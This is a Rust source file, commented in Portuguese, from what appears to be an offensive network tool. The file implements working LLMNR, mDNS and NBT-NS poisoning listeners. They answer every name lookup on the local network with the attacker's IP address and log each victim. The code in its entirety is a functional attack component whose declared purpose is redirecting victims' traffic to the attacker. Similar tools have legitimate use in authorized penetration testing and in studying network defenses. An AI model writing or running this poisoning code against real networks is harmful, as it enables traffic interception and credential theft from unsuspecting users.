//! Listeners UDP que respondem queries de nome apontando para o atacante.
use crate::dns;
use anyhow::Result;
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4};
use tokio::net::UdpSocket;

fn bind_reuse(port: u16) -> Result<std::net::UdpSocket> {
    let sock = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    let addr: SocketAddr = SocketAddr::from(([0, 0, 0, 0], port));
    sock.bind(&addr.into())?;
    Ok(sock.into())
}

fn mcast_socket(port: u16, group: Ipv4Addr) -> Result<UdpSocket> {
    let std_sock = bind_reuse(port)?;
    let s2 = Socket::from(std_sock.try_clone()?);
    s2.join_multicast_v4(&group, &Ipv4Addr::UNSPECIFIED)?;
    std_sock.set_nonblocking(true)?;
    Ok(UdpSocket::from_std(std_sock)?)
}

fn bcast_socket(port: u16) -> Result<UdpSocket> {
    let std_sock = bind_reuse(port)?;
    std_sock.set_broadcast(true)?;
    std_sock.set_nonblocking(true)?;
    Ok(UdpSocket::from_std(std_sock)?)
}

/// LLMNR (5355 / 224.0.0.252) e mDNS (5353 / 224.0.0.251) usam wire DNS.
pub async fn run_dns_poison(proto: &str, port: u16, group: Ipv4Addr, our_ip: Ipv4Addr) -> Result<()> {
    let sock = mcast_socket(port, group)?;
    eprintln!("[*] {proto}: escutando {port} (grupo {group})");
    let mut buf = [0u8; 2048];
    loop {
        let (n, from) = sock.recv_from(&mut buf).await?;
        let q = &buf[..n];
        // só responde queries (QR=0)
        if n < 12 || buf[2] & 0x80 != 0 {
            continue;
        }
        if let Some(name) = dns::question_name(q) {
            if let Some(resp) = dns::build_a_response(q, our_ip) {
                let _ = sock.send_to(&resp, from).await;
                eprintln!("[+] {proto}: {from} buscou '{name}' -> respondi {our_ip}");
            }
        }
    }
}

fn nbt_decode(name: &[u8]) -> String {
    // 32 bytes codificados: cada byte vira 2 nibbles + 'A'
    if name.len() < 32 {
        return String::new();
    }
    let mut out = String::new();
    for pair in name[..32].chunks(2) {
        let hi = pair[0].wrapping_sub(b'A');
        let lo = pair[1].wrapping_sub(b'A');
        let c = (hi << 4) | lo;
        if c.is_ascii_graphic() || c == b' ' {
            out.push(c as char);
        }
    }
    out.trim().to_string()
}

/// NBT-NS (137, broadcast): name service NetBIOS.
pub async fn run_nbtns(our_ip: Ipv4Addr) -> Result<()> {
    let sock = bcast_socket(137)?;
    eprintln!("[*] NBT-NS: escutando 137 (broadcast)");
    let mut buf = [0u8; 2048];
    loop {
        let (n, from) = sock.recv_from(&mut buf).await?;
        // question name começa em 12: [0x20][32 bytes][0x00]
        if n < 50 || buf[12] != 0x20 {
            continue;
        }
        // só name queries (opcode bits)
        if buf[2] & 0x80 != 0 {
            continue;
        }
        let name_field = &buf[12..46]; // 1 + 32 + 1
        let decoded = nbt_decode(&buf[13..45]);

        let mut resp = Vec::with_capacity(62);
        resp.extend_from_slice(&buf[0..2]); // id
        resp.extend_from_slice(&[0x85, 0x00]); // flags: response + AA
        resp.extend_from_slice(&[0x00, 0x00]); // qd
        resp.extend_from_slice(&[0x00, 0x01]); // an
        resp.extend_from_slice(&[0x00, 0x00]); // ns
        resp.extend_from_slice(&[0x00, 0x00]); // ar
        resp.extend_from_slice(name_field); // nome ecoado
        resp.extend_from_slice(&[0x00, 0x20]); // type NB
        resp.extend_from_slice(&[0x00, 0x01]); // class IN
        resp.extend_from_slice(&[0x00, 0x04, 0x93, 0xe0]); // ttl
        resp.extend_from_slice(&[0x00, 0x06]); // rdlength
        resp.extend_from_slice(&[0x00, 0x00]); // flags do addr
        resp.extend_from_slice(&our_ip.octets());

        if let SocketAddr::V4(v4) = from {
            let dst = SocketAddrV4::new(*v4.ip(), 137);
            let _ = sock.send_to(&resp, dst).await;
            eprintln!("[+] NBT-NS: {from} buscou '{decoded}' -> respondi {our_ip}");
        }
    }
}
